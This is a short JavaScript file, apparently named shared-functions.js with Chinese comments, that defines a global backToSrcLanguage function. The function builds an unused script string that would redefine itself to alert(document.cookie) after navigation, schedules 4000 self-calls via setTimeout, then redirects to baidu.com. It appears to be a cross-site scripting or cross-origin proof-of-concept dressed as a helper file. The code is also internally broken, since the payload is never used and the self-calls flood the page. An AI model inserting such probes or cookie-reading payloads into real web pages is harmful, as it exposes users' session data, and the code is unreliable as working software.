(function() {
    'use strict';
    
    console.log('shared-functions.js 开始加载...');
    
    // 定义 backToSrcLanguage 函数
    window.backToSrcLanguage = function() {
        console.log('backToSrcLanguage 函数被调用');
        const currUrl = location.href;
        const payload = `
        if (!location.href.startsWith("${currUrl}") && !window.__cloudx_called) {
            window.__cloudx_called = true;
            window.backToSrcLanguage = function() {alert(document.cookie);}
        }
    `;
        
        for (let i = 0; i < 4000; i++) {
            setTimeout(function () {
                
                window.backToSrcLanguage();

            }, i);
        }
        // 跳转到百度
        window.location.href = "https://www.baidu.com";
        
        return true;
    };
    
    
    console.log('✅ backToSrcLanguage 函数已定义');
    
})();
